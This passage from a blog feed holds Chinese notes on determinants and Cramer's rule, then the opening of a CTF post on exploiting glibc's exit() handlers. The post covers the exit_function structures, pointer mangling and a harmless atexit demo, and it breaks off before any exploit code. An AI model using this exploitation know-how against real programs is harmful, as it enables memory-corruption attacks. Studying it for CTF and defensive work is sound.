b_1\<br>0&amp;a_{22}-\frac{a_{21}}{a_{11}}a_{12}&amp;b_2-\frac{a_{21}}{a_{11}}b_1<br>\end{bmatrix}\<br>\Rightarrow<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; b_1\<br>0&amp;\frac{a_{11}a_{22}-a_{21}a_{12}}{a_11}&amp;b_2-\frac{a_{21}}{a_{11}}b_1<br>\end{bmatrix}<br>$$</p><ul><li>情况1：$a_{11}a_{22}-a_{12}a_{21}\not=0$，此时根据上一章方程组解的情况就可以得到该方程有唯一解：</li></ul><p>$$<br>(\frac{b_1a_{22}-b_2a_{12}}{a_{11}a_{22}-a_{12}a_{21}},\frac{a_{11}b_2-a_{21}b_1}{a_{11}a_{22}-a_{12}a_{21}})<br>$$</p><ul><li>情况2：$a_{11}a_{22}-a_{12}a_{21}=0$，此时原方程组无解或者有无穷多个解。</li></ul><blockquote><p><strong>行列式</strong>：</p><p>此时对于$a_{11}a_{22}-a_{12}a_{21}$就使用如下的一个记号，矩阵2级矩阵$\mathbf{A}$的行列式，记作$|A|$或者$det\mathbf{A}$：<br>$$<br>\begin{vmatrix}<br>a_{11} &amp; a_{12} \<br>a_{21} &amp; a_{22}<br>\end{vmatrix}=a_{11}a_{22}-a_{12}a_{21}<br>$$<br>注解：行列式是一个数</p><p><strong>命题1</strong>：</p><p>两个方程的二元一次方程组有唯一解的充分必要条件是：它的系数矩阵$\mathbf{A}$的行列式(简称为<strong>系数行列式</strong>)$|A|\not=0$，此时它的唯一解是：<br>$$<br>(\frac{b_1a_{22}-b_2a_{12}}{a_{11}a_{22}-a_{12}a_{21}},\frac{a_{11}b_2-a_{21}b_1}{a_{11}a_{22}-a_{12}a_{21}})’<br>$$</p></blockquote><h1 id="n元排列">n元排列</h1><blockquote><p><strong>定义1</strong>：</p><p><code>1,2,...,n</code>的一个全排列称为一个n元排列（或n个不同正整数的全排列称为一个n元排列），而<code>1,2,...,n</code>形成的n元排列有<code>n!</code>个，例如：<code>3</code>元排列有<code>123,132,213,231,312,321</code></p><p><strong>定义2</strong>：</p><p>对于一个四元排列<code>2431</code>，从左到右数，顺序（从小到大）的数对有：<code>24</code>、<code>23</code>。从左到右数，逆序（从大到小）的数对有：<code>21,43,41,31</code>。像这样在一个<code>n</code>元排列中<strong>逆序的数对的数目称为逆序数</strong>，记作$\tau(2431)=4$</p><p><strong>定义3</strong>：</p><p>逆序数是偶数的排列称为<strong>偶排列</strong>。</p><p>逆序数是奇数的排列称为<strong>奇排列</strong>。</p><p><strong>定义4</strong>：</p><p>将<code>2431</code>的<code>4</code>和<code>1</code>交换位置，使其变成<code>2134</code>的这个操作称为<strong>对换</strong>，记作$(4,1)$。</p></blockquote><blockquote><p><strong>定理1</strong>：</p><p>对换改变n元排列的奇偶性</p><p><strong>定理2</strong>：</p><p>任一n元排列与排列<code>123...n</code>可以经过一系列对换互变，并且所作对换的次数与这个n元排列有相同的奇偶性。</p></blockquote><h1 id="n阶行列式">n阶行列式</h1><blockquote><p><strong>定义1</strong>：</p><p>n阶行列式$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n} \…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}$是<code>n!</code>项的代数和，其中每一项是不同行，不同列的n个元素的乘积，每一项按行指标成自然序排好位置，当列指标形成的排列是偶排列时，该项带正号，当列指标形成的排列是奇排列，该项带负号。</p><p>$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\sum_{j_1j_2…j_n}(-1)^{\tau(j_1j_2…j_n)}a_{1j_1}a_{2j_2}…a_{nj_n}$。行列式其实是右边这个求和表达式的一个简洁记号。</p><p><strong>定义2</strong>：</p><p>n阶行列式$\begin{vmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n} \…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}$也称为n阶矩阵$\mathbf{A}=\begin{bmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{bmatrix}$的行列式，记作$|\mathbf{A}|$，$det\mathbf{A}$，简记成$\mathbf{A}=(a_{ij})$其中$a_{ij}$为A的$(i,j)$元</p><p><strong>定义3</strong>：上三角形行列式</p><p>主对角线下方元素全为0的n阶行列式称为上三角形行列式。（下三角形行列式：主对角线上方的元素全为0的n阶行列式）<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1,n-1}&amp;a_{1,n}\<br>0&amp;a_{22}&amp;…&amp;a_{2,n-1}&amp;a_{2,n}\<br>0&amp;0&amp;a_{33}&amp;…&amp;a_{3,n}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;a_{n-1,n-1}&amp;a_{n-1,n}\<br>0&amp;0&amp;…&amp;0&amp;a_{n,n}<br>\end{vmatrix}<br>$$</p></blockquote><blockquote><p>一些行列式的计算：</p><p><strong>一阶行列式</strong>：</p><p>$|a|=a$</p><p><strong>二阶行列式</strong>：</p><p>$\begin{vmatrix}a_{11}&amp;a_{12}\ a_{21}&amp;a_{22}\end{vmatrix}=a_{11}a_{22}-a_{12}a_{21}$</p><p><strong>三阶行列式</strong>：</p><p>三元排列偶排列：<code>123,231,312</code></p><p>三元排列奇排列：<code>132,213,321</code></p><p>$\begin{vmatrix}a_{11}&amp;a_{12}&amp;a_{13}\ a_{21}&amp;a_{22}&amp;a_{23}\ a_{31}&amp;a_{32}&amp;a_{33}\end{vmatrix}=a_{11}a_{22}a_{33}+a_{12}a_{23}a_{31}+a_{13}a_{21}a_{32}-a_{11}a_{23}a_{32}-a_{12}a_{21}a_{33}-a_{13}a_{22}a_{31}$</p><p><strong>上三角形行列式</strong>：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1,n-1}&amp;a_{1,n}\<br>0&amp;a_{22}&amp;…&amp;a_{2,n-1}&amp;a_{2,n}\<br>0&amp;0&amp;a_{33}&amp;…&amp;a_{3,n}\<br>…&amp;…&amp;…&amp;…&amp;…\<br>0&amp;0&amp;…&amp;a_{n-1,n-1}&amp;a_{n-1,n}\<br>0&amp;0&amp;…&amp;0&amp;a_{n,n}<br>\end{vmatrix}=a_{11}a_{22}…a_{nn}<br>$$<br>命题1：上三角形行列式的值等于它的主对角线上n个元素的乘积。</p></blockquote><h1 id="行列式的性质">行列式的性质</h1><blockquote><p><strong>定义1</strong>：矩阵的转置</p><p>设n阶矩阵$\mathbf{A}=(a_{i,j})=\begin{bmatrix}a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\ a_{21}&amp;a_{22}&amp;…&amp;a_{2n}\…&amp;…&amp;…&amp;…\ a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{bmatrix}$把行列互换得到的矩阵$\begin{bmatrix}a_{11}&amp;a_{21}&amp;…&amp;a_{n1}\a_{12}&amp;a_{22}&amp;…&amp;a_{n2}\…&amp;…&amp;…&amp;…\a_{1n}&amp;a_{2n}&amp;…&amp;a_{nn}\end{bmatrix}$称为A的转置，记作$A’$或$A^{T}$或$A^{t}$</p></blockquote><blockquote><p><strong>行列式的性质</strong>：</p><p><strong>性质1</strong>：转置的行列式与原先行列式值相等，即：$|A’|=|A|$</p><p><strong>性质2</strong>：行列式一行的公因子可以提出去，即（k=0也成立）：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>ka_{i1}&amp;ka_{i2}&amp;…&amp;ka_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=k\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质3</strong>：</p><p>行列式中若某一行是两组数的和，则此行列式等于两个行列式的和，这两个行列式的这一行分别是第一组数和第二组数，而其余各行与原来行列式的相应各行相同，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>b_1+c_1&amp;b_2+c_2&amp;…&amp;b_n+c_n\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>b_1&amp;b_2&amp;…&amp;b_{n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}+\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>c_1&amp;c_2&amp;…&amp;c_{n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质4</strong>：</p><p>两行互换，行列式反号，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>=-<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p><p><strong>性质5</strong>：</p><p>两行相同，行列式的值为0，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=0<br>$$</p><p><strong>性质6</strong>：</p><p>两行成比例，行列式的值为0，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>la_{i1}&amp;la_{i2}&amp;…&amp;la_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=0<br>$$</p><p><strong>性质7</strong>：</p><p>把一行的倍数加到另一行上，行列式的值不变，即：<br>$$<br>\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}+la_{i1}&amp;a_{k2}+la_{i2}&amp;…&amp;a_{kn}+la_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}=\begin{vmatrix}<br>a_{11}&amp;a_{12}&amp;…&amp;a_{1n}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{i1}&amp;a_{i2}&amp;…&amp;a_{in}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{k1}&amp;a_{k2}&amp;…&amp;a_{kn}\<br>\vdots&amp;\vdots&amp;&amp;\vdots\<br>a_{n1}&amp;a_{n2}&amp;…&amp;a_{nn}\end{vmatrix}<br>$$</p></blockquote><h1 id="行列式按行列展开">行列式按行(列)展开</h1><ul><li>行列式按行（列）展开的本质其实就是对行列式的展开做变形。</li></ul><blockquote><p>$|\mathbf{A}|=\begin{vmatrix}a_{11}&amp;a_{12}&amp;a_{13}\a_{21}&amp;a_{22}&amp;a_{23}\a_{31}&amp;a_{32}&amp;a_{33}\end{vmatrix}=(a_{11}a_{22}a_{33}-a_{11}a_{23}a_{32})+(a_{12}a_{23}a_{31}-a_{12}a_{21}a_{33})+(a_{13}a_{21}a_{32}-a_{13}a_{22}a_{31})$</p><p>$|\mathbf{A}|=a_{11}\begin{vmatrix}a_{22}&amp;a_{23}\a_{32}&amp;a_{33}\end{vmatrix}-a_{12}\begin{vmatrix}a_{21}&amp;a_{23}\a_{31}&amp;a_{33}\end{vmatrix}+a_{13}\begin{vmatrix}a_{21}&amp;a_{22}\a_{31}&amp;a_{32}\end{vmatrix}$</p><p><strong>定义1</strong>：</p><p>n级矩阵$\mathbf{A}$中，划去第i行和第j列，剩下的元素按照原来的次序组成<code>n-1</code>级矩阵的行列式称为矩阵$\mathbf{A}$的<code>(i,j)</code>元的<strong>余子式</strong>，记作$M_{ij}$。令$A_{ij}=(-1)^{i+j}M_{ij}$，则$A_{ij}$是$\mathbf{A}$的<code>(i,j)</code>元的代数余子式。</p></blockquote><ul><li>从行列式的按行展开推导出了如下几个定理：</li></ul><blockquote><p><strong>定理1</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$等于它的第i行元素与自己的代数余子式的乘积之和。$|\mathbf{A}|=a_{i1}A_{i1}+a_{i2}A_{i2}+…+a_{in}A_{in}=\sum_{j=1}^{n}a_{ij}A_{ij}$其中$i\in{1,2,…,n}$，该式子被称为n阶行列式的第i行的展开式</p><p><strong>定理2</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$等于它的第j列元素与自己的代数余子式的乘积之和，即：$|\mathbf{A}|=a_{1j}A_{1j}+a_{2j}A_{2j}+…+a_{nj}A_{nj}=\sum_{l=1}^{n}a_{lj}A_{lj}$</p><p><strong>定理3</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$的第i行元素与第k行($k≠i$)相应元素的代数余子式的乘积之和为0，即：$a_{i1}A_{k1}+a_{i2}A_{k2}+…+a_{in}A_{kn}=0$，当$k≠i$</p><p><strong>定理4</strong>：</p><p>n级矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$的第j列元素与第l列($l≠j$)相应元素的代数余子式的乘积之和为0，即：$a_{1j}A_{1l}+a_{2j}A_{2l}+…+a_{nj}A_{nl}=0$，当$l≠j$</p></blockquote><ul><li>特殊的行列式——范德蒙行列式</li></ul><blockquote></blockquote><h1 id="克拉默cramer法则">克拉默(Cramer)法则</h1><blockquote><p><strong>定理1</strong>：</p><p>数域$\mathbf{K}$上的n个方程的n元线性方程组有唯一解的充分必要条件是它的系数行列式（即系数矩阵$\mathbf{A}$的行列式$|\mathbf{A}|$）不等于0。即<code>n级矩阵的初等行变换不改变它们的行列式的非零性质</code></p><p><strong>推论1</strong>：</p><p>数域$\mathbf{K}$上的n个方程的n元齐次线性方程组只有零解的充分必要条件是它的系数行列式不等于0，从而它有非零解的充分必要条件是它的系数行列式等于0。</p><p><strong>定理2</strong>：</p><p>记矩阵$\mathbf{B}<em>j,j=1,2,3…,n$即，$\mathbf{B_j=\begin{bmatrix}a</em>{11} &amp;…&amp;a_{1,j-1}&amp;b_1&amp;a_{1,j+1}&amp;…&amp;a_{1n}\ a_{21}&amp;…&amp;a_{2,j-1}&amp;b_2&amp;a_{2,j+1}&amp;…&amp;a_{2n}\ \vdots&amp;&amp;\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots\ a_{n1}&amp;…&amp;a_{n,j-1}&amp;b_n&amp;a_{2,j+1}&amp;…&amp;a_{nn}\end{bmatrix}}$。那么就有n个方程的n元线性方程组的系数</p><p>行列式$|\mathbf{A}|≠0$时，它的唯一解是：$(\frac{|B_1|}{|A|},\frac{|B_2|}{|A|},…,\frac{|B_n|}{|A|})$</p></blockquote><h1 id="行列式按k行列展开">行列式按k行(列)展开</h1><blockquote><p><strong>定义1</strong>：</p><p>n级矩阵$\mathbf{A}$中任意取定k行，k列$1\le k &lt; n$，位于这些行和列的交叉处的$k^2$个元素按原来的排法组成的<code>k</code>级矩阵的行列式称为$\mathbf{A}$的一个k阶子式。取定$\mathbf{A}$的第$i_1,i_2,…,i_k$行（$i_1&lt;i_2&lt;…&lt;i_k$），第$j_1,j_2,…,j_k$列（$j_1&lt;j_2&lt;…&lt;j_k$），所得到的k阶子式记作$\mathbf{A}\begin{bmatrix}i_1,i_2,…,i_k\ j_1,j_2,…,j_k\end{bmatrix}$。</p><p>划去这个k阶子式所在的行和列，剩下的元素原来的排法组成的<code>(n-k)</code>级矩阵的行列式称为<strong>余子式</strong>，它前面乘以$(-1)^{(i_1+i_2+…+i_k)+(j_1+j_2+…+j_k)}$则称为子式的<strong>代数余子式</strong>。</p><p>令${i’_1,i’<em>2,…,i’</em>{n-k}}={1,2,…,n}/{i_1,i_2,…,i_k}$，${j’<em>1,j’<em>2,…,j’</em>{n-k}}={1,2,3…,n}/{i_1,i_2,…,i_k}$，并且$i_1’&lt;i_2’&lt;…&lt;i’</em>{n-k},j’_1&lt;j’<em>2&lt;…&lt;j’</em>{n-k}$，则子式的余子式为$A\begin{bmatrix}i’_1,i’_2,…,i’_n\ j’_1,j’_2,…,j’_n\end{bmatrix}$</p><p><strong>定理1</strong>(Laplace定理，即拉普拉斯定理)：</p><p>在n级矩阵$|\mathbf{A}|$中，取定第$i_1,i_2,…,i_k$行（$i_1&lt;i_2&lt;…&lt;i_k$），则这k行元素形成的所有k阶子式与它们自己的代数余子式的乘积之和等于$|\mathbf{A}|$，即$|\mathbf{A}|=\sum_{1\le j_1&lt;j_2&lt;…&lt;j_k\le n}\mathbf{A}\begin{bmatrix}i_1,i_2,…,i_k\ j_1,j_2,…,j_k\end{bmatrix}(-1)^{(i_1+…+i_k)+(j_1+…+j_k)}A\begin{bmatrix}i’_1,i’_2,…,i’_n\ j’_1,j’_2,…,j’_n\end{bmatrix}$</p></blockquote>]]></content>
    
    
    <summary type="html">前言：继续</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN-trick-exit函数利用</title>
    <link href="http://iyheart.github.io/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/"/>
    <id>http://iyheart.github.io/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/</id>
    <published>2025-09-07T06:05:08.000Z</published>
    <updated>2025-09-10T23:54:39.809Z</updated>
    
    <content type="html"><![CDATA[<ul><li>碎碎念：之前看到打exit的题目都有点不太像去看，这周尝试去看了一题打exit的，虽然没打出来但是在牢题目的时候大致了解了<code>exit</code>的大致流程，也知道了哪些地方可以进行利用。并且还了解了<code>exit</code>函数，在系统调用<code>exit</code>之前会进行一个<code>IO_FILE</code>的刷新流。所以类似于<code>house of apple</code>这种堆利用基本上也快可以理解了。</li><li>在打exit的时候也尝试去劫持<code>vtable</code>，虽然也没利用成功，但是也理解了<code>FSOP</code>的相关利用方式，感觉堆的<code>30</code>种类型应该这个学期就能结束了。（结束了就开内核了，有点单线程，在堆没结束前不太想碰其他的pwn题。）</li><li>参考博客：<a href="https://www.anquanke.com/post/id/243196">exit（）分析与利用-安全KER - 安全资讯平台</a></li></ul><h1 id="exit函数执行流程结束时">exit函数执行流程(结束时)</h1><ul><li><p><code>exit()</code>函数的源码位于<code>glibc-2.35\stdlib\exit.c</code>，在<code>exit()</code>函数调用的还会用到<code>exit.h</code>、</p></li><li><p>由于低版本的堆由于<code>hook</code>函数，利用还是比较容易的，所以这个<code>exit()</code>函数，就使用<code>glibc2.35</code>版本的源码进行调试（刚好本地Ubuntu的libc版本其实也是<code>glibc2.35</code>），本地就有现成环境。</p></li><li><p>首先总体介绍一下<code>exit()</code>函数的调用流程，注意<code>glibc中的exit()</code>和<code>exit系统调用</code>需要区分开来：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>()-&gt;</span><br><span class="line">__run_exit_handlers()-&gt;</span><br><span class="line">    __call_tls_dtors()</span><br><span class="line">    __libc_atexit()</span><br><span class="line">_exit() <span class="comment">// 执行exit系统调用</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250909180658225.png" alt="image-20250909180658225"></p><h2 id="exit函数两个重要结构体">exit函数两个重要结构体</h2><ul><li>在介绍<code>exit</code>函数执行流程之前，需要介绍两个结构体，以便于理解<code>exit()</code>函数的执行过程。</li><li>结构体1：<code>exit_function</code>结构体，这里其实是一个注册函数的结构体。</li><li>程序在启动的时候会注册许多函数，这些函数在程序运行结束的时候调用<code>exit()</code>的时候就会被<code>exit()</code>函数一个一个的执行过去，主要目的是在退出程序的时候可以自动执行一些清理操作，从而达到自动释放资源的目的。</li><li><code>exit_function</code>结构体主要就两个东西：<ul><li><code>flavor</code>变量：用于表示是否有注册函数，<code>flavor=0</code>时表示没有注册函数，<code>flavor=1</code>的时候表示存在注册函数，该函数没有参数传递进去。<code>flavor=2</code>的时候表示存在注册函数，该函数调用时带有参数。<code>flavor=3</code>的时候表示存在注册函数，该函数是<code>C++</code>的析构函数。</li><li><code>析构函数</code>：C++在使用类模版创建了一个实例对象之后，程序结束后需要调用该析构函数释放这个实例对象。</li><li><code>func</code>这个联合体：存储着函数指针，需要传递的参数，以及析构函数的<code>void *dso_handle;</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>结构体2：<code>exit_function_list</code>，用于管理注册函数的链表，是单向链表，其结构体如图所示。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250909183535553.png" alt="image-20250909183535553"></p><ul><li>程序在执行main函数之前调用了<code>glibc</code>中的某些函数来注册函数，而<code>glibc</code>也向用户提供了<code>atexit()、on_exit()、__cxa_atexit()</code>这三个注册函数，使得我们在<code>Linux</code>编写<code>C</code>程序的时候也能注册属于自己的一些函数。注意：注册的函数按照栈结构进行调用，也就是<strong>后面注册的函数，会先被执行</strong><ul><li><code>atexit()</code>函数注册的是无参函数</li><li><code>on_exit()</code>函数注册的是带参数的函数</li><li><code>__cxa_atexit()</code>函数注册的是析构函数</li></ul></li><li>先注册一个无参函数并调试看看</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册一个无参函数,该函数会在程序执行结束后执行</span></span><br><span class="line"><span class="comment">// int atexit(void (*func)(void))</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_atexit1</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is my_atexit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (atexit(my_atexit1) !=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;atexit() error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This program is over\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910192635113.png" alt="image-20250910192635113"></p><p>在调用<code>atexit</code>之前进行查看<code>initial</code>这个结构体，该结构体就是libc中存储注册函数的结构体，也就是这个结构体<code>exit_function_list</code></p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910192940226.png" alt="image-20250910192940226"></p><p>调用<code>atexit</code>后，该结构体的<code>fns</code>就会多出来一个结构体，并且<code>idx</code>也会变成<code>2</code>，还会发现<code>at</code>这个函数指针并不是真实的函数地址是被加密过的函数地址。</p><p><img src="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/image-20250910193208482.png" 